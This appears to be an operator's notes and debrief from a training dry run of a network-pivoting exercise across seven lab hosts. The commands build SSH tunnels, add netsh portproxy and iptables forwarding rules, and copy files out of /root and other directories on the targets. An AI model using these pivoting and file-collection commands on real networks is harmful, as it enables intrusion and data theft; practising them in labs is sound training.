@@ -1,0 +1,233 @@
+Scheme of Maneuver:
+> T1: 10.50.27.188
+-> T2: 10.145.117.10
+--> T3: 10.145.117.16
+---> T4: 192.169.117.200
+----> T5: 192.169.117.201
+-----> T6: 192.169.117.202
+----> T7: 192.169.117.203
+
+
+ANGRYHERMIT has been updated and may once again be employed on Cisco devices.
+All firewall manipulation requires MC approval prior to execution. File download methods must receive MC approval prior to execution due to unknown administrative posture in this network.
+
+T1 >>Entry Router<<
+Hostname: EXT_RTR
+IP: 10.50.27.188 //10.145.117.86
+MAC: fa:16:3e:91:7a:88
+OS: CentOS7
+Creds: student#::password#
+Last Known SSH Port: 22011
+ssh -MS /tmp/T1 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@10.50.27.188 -p 22011
+password4
+Action: Perform SSH masquerade and redirect to the next target.
+
+T2
+Hostname: SERVER0
+IP: 10.145.117.10
+MAC: fa:16:3e:6e:ad:f6
+OS: Windows Server 2019
+Creds: student#::password#
+Last Known SSH Port: 22012
+Security Product(s): Windows Defender (enabled)
+ssh -S /tmp/T1 bad -O forward -L 2222:10.145.117.10:22012
+ssh -S /tmp/T1 bad -O cancel -L 2222:10.145.117.10:22012
+ssh -MS /tmp/T2 -p 2222 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+password4
+Action: Perform SSH masquerade and redirect to the next target via netsh. Use port 310## for your netsh rule.
+netsh interface show interface
+netsh interface ip show address
+netsh interface ip show dns
+@@GET MC APPROVAL
+####TUNNELING####
+netsh interface portproxy show all
+netsh interface portproxy add v4tov4 listenport=31004 listenaddress=10.145.117.10 connectport=22012 connectaddress=10.145.117.16 protocol=tcp
+<delete!!>
+netsh interface portproxy delete v4tov4 listenport=31004 listenaddress=10.145.117.10
+
+
+T3
+Hostname: DryRuns-int_rtr2
+IP: 10.145.117.16 // 192.169.117.198
+MAC: fa:16:3e:db:41:dd // fa:16:3e:09:40:00
+OS: CentOS 7
+Creds: student#::password#
+Last Known SSH Port: 22012
+ssh -S /tmp/T1 bad -O forward -L 3333:10.145.117.10:31004
+ssh -S /tmp/T1 bad -O cancel -L 3333:10.145.117.10:31004
+ssh -MS /tmp/T3 -p 3333 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+password4
+Action: Perform SSH masquerade and redirect to the next target.
+
+
+T4
+Hostname: ADMIN2
+IP: 192.169.117.200
+MAC: fa:16:3e:65:bb:96
+OS: CentOS7
+Creds: student#::password#
+Last Known SSH Port: 22013
+ssh -S /tmp/T3 bad -O forward -L 4444:192.169.117.200:22013
+ssh -MS /tmp/T4 -p 4444 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+password4
+Action: Perform SSH masquerade and conduct device @@survey. Record any changes since last operation and @@@collect any new files of interest identified by analyst. Redirect to the next target.
+
+
+T5
+Hostname: TARGETA
+IP: 192.169.117.201 // 129.168.117.45
+MAC: fa:16:3e:a8:95:5f//fa:16:3e:e1:f9:3d
+OS: Ubuntu 18.04
+Creds: student#::password#
+Last Known SSH Port: 22013
+ssh -S /tmp/T4 bad -O forward -L 5555:192.169.117.201:22013
+ssh -MS /tmp/T5 -p 5555 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+password4
+Action: Perform SSH masquerade and conduct @@device survey. Record any changes since last operation. Find all “.txt” files on system. Reporting suggests there is a specific file of intelligence value on this system. @@@Collect files of interest identified by analyst. Redirect to the next target via iptables. Use port 228## as your forwarding port.
+sudo grep -r "*.txt" /
+sudo find / -type f -name "*.txt"
+
+
+sudo ls -latrH /tmp/file3.txt
+sudo ls -latrH /root/file2.txt
+sudo ls -latrH /home/file1.txt
+sudo ls -latrH /maytheforcebewithyou.txt
+sudo ls -latrH /etc/file4.txt
+
+sudo md5sum /tmp/file3.txt
+sudo md5sum /root/file2.txt
+sudo md5sum /home/file1.txt
+sudo md5sum /maytheforcebewithyou.txt
+sudo md5sum /etc/file4.txt
+
+scp -o ControlPath=/tmp/T5 -P 5555 student4@localhost:/home/file1.txt file1.txt
+scp -o ControlPath=/tmp/T5 -P 5555 student4@localhost:/tmp/file3.txt file3.txt
+scp -o ControlPath=/tmp/T5 -P 5555 student4@localhost:/etc/file4.txt file4.txt
+scp -o ControlPath=/tmp/T5 -P 5555 student4@localhost:/maytheforcebewithyou.txt maytheforcebewithyou.txt
+ssh -S /tmp/T5 student4@localhost -p 5555 "sudo cat /root/file2.txt" > file2.txt
+
+md5sum file1.txt
+md5sum file3.txt
+md5sum file4.txt
+md5sum maytheforcebewithyou.txt
+md5sum file2.txt
+
+
+lsmod
+<check existing iptable rules>
+<check forwarding rule>
+<confirm with MC before>
+sudo iptables -t nat -A PREROUTING -p tcp --dport 22804 -j DNAT --to-destination 192.169.117.202:22013
+sudo iptables -t nat -A POSTROUTING -p tcp --dport 22013 -j SNAT --to-source 192.169.117.201
+sudo iptables -t nat -A POSTROUTING -p tcp -d 192.169.117.202 -j SNAT --to-source 192.168.117.201
+sudo iptables -t nat -L
+cat /proc/sys/net/ipv4/ip_forward
+<confirm with MC>
+sudo sysctl -w net.ipv4.ip_forward=1
+sudo echo 1 > /proc/sys/net/ipv4/ip_forward
+sudo iptables -t nat -D PREROUTING -p tcp --dport 22804 -j DNAT --to-destination 192.169.117.202:22013
+sudo iptables -t nat -D POSTROUTING -p tcp --dport 22013 -j SNAT --to-source 192.169.117.201
+sudo iptables -t nat -D POSTROUTING -p tcp -d 192.169.117.202 -j SNAT --to-source 192.168.117.201
+
+T6
+Hostname: TARGETB
+IP: 192.169.117.202
+MAC: Unknown
+OS: Linux v unknown
+Creds: student#::password#
+Last Known SSH Port: 22013
+ssh -S /tmp/T4 bad -O forward -L 6666:192.169.117.201:22804
+ssh -S /tmp/T5 bad -O cancel -L 6666:192.169.117.201:22804
+ssh -MS /tmp/T6 -p 6666 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+password4
+Action: Perform SSH masquerade and conduct @@device survey. @@@Collect all image files in root’s home directory recursively. Maneuver to the next target.
+
+
+sudo find /root -type f \( -iname \*.jpg -o -iname \*.png -o -iname \*.jpeg \) -ls 
+
+sudo md5sum /root/Warships.jpeg
+sudo md5sum /root/Pics/Electric_PowerPlant.jpeg
+sudo md5sum /root/Pics/powerplant.jpg
+sudo md5sum /root/Pics/Components-of-a-nuclear-power-plant-1400x803.png
+sudo md5sum /root/shipyard.jpg
+sudo md5sum /root/Downloads/UFO2.jpeg
+sudo md5sum /root/Downloads/American_Spy.jpg
+sudo md5sum /root/Downloads/UFO1.jpg
+sudo md5sum /root/Downloads/Spy.jpeg
+sudo md5sum /root/Ship.jpeg
+
+ssh -S /tmp/T6 student4@localhost -p 6666 "sudo cat /root/Warships.jpeg" > Warships.jpeg
+ssh -S /tmp/T6 student4@localhost -p 6666 "sudo cat /root/Pics/Electric_PowerPlant.jpeg" > Electric_PowerPlant.jpeg
+ssh -S /tmp/T6 student4@localhost -p 6666 "sudo cat /root/Pics/powerplant.jpg" > powerplant.jpg
+ssh -S /tmp/T6 student4@localhost -p 6666 "sudo cat /root/Pics/Components-of-a-nuclear-power-plant-1400x803.png" > Components-of-a-nuclear-power-plant-1400x803.png
+ssh -S /tmp/T6 student4@localhost -p 6666 "sudo cat /root/shipyard.jpg" > shipyard.jpg
+ssh -S /tmp/T6 student4@localhost -p 6666 "sudo cat /root/Downloads/UFO2.jpeg" > UFO2.jpeg
+ssh -S /tmp/T6 student4@localhost -p 6666 "sudo cat /root/Downloads/American_Spy.jpg" > American_Spy.jpg
+ssh -S /tmp/T6 student4@localhost -p 6666 "sudo cat /root/Downloads/UFO1.jpg" > UFO1.jpg
+ssh -S /tmp/T6 student4@localhost -p 6666 "sudo cat /root/Downloads/Spy.jpeg" > Spy.jpeg
+ssh -S /tmp/T6 student4@localhost -p 6666 "sudo cat /root/Ship.jpeg" > Ship.jpeg
+
+sudo md5sum Warships.jpeg
+sudo md5sum Electric_PowerPlant.jpeg
+sudo md5sum powerplant.jpg
+sudo md5sum Components-of-a-nuclear-power-plant-1400x803.png
+sudo md5sum shipyard.jpg
+sudo md5sum UFO2.jpeg
+sudo md5sum American_Spy.jpg
+sudo md5sum UFO1.jpg
+sudo md5sum Spy.jpeg
+sudo md5sum Ship.jpeg
+
+####DISCONNECT T6 and T5 before T7!!#####
+
+
+T7
+Hostname: TARGETC
+IP: 192.169.117.203
+MAC: Unknown
+OS: Windows v. unknown
+Creds: student#::password#
+Last Known SSH Port: 22013
+Security Product(s): Windows Defender (version unknown)
+ssh -S /tmp/T4 bad -O forward -L 7777:192.169.117.203:22013
+ssh -MS /tmp/T7 -p 7777 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null student4@localhost
+password4
+Action: Perform SSH masquerade and conduct @@device survey. @@@Collect any files of interest identified by the analyst. Conclude operation.
+ssh -S /tmp/T7 bad 'wmic service list full' >> Survey_192.168.117.203
+
+
+
+DEBRIEF 
+
+Operator: 1LT An
+
+Operation: DRYRUN04
+
+MC: mc2
+
+Analyst: analyst2
+
+Description: DRYRUN04 is a C-ISR mission. On T1, we redirected to T2 via ssh masquerade. On T2, we redirected to T3 using netsh portproxy. On T3, we redirected to t4 using ssh masquerade. On T4, we performed survey and redirected to T5. On T5, we performed survey and collected .txt files of interest (total of 5). We set up iptable rules to redirect to T6. On T6, we performed survey and collected 10 image files related to enemy's critical assets. We then went back to T4 to redirect to T7. On T7, we performed survey and concluded the operation.
+
+
+Violation/potin deduc:
+disconnected from T3 via operator action
+POSTROUTING rule added
+T2 non-standard discovered late
+problem with termscreens postop
+typo in one of the report
+
+hidden:
+disconnected from all terminals...the processes lived
+found T2 NS late...
+had to restart kali to clear all hanging ssh connections...
+
+
+
+
+
+
+
+
+
+
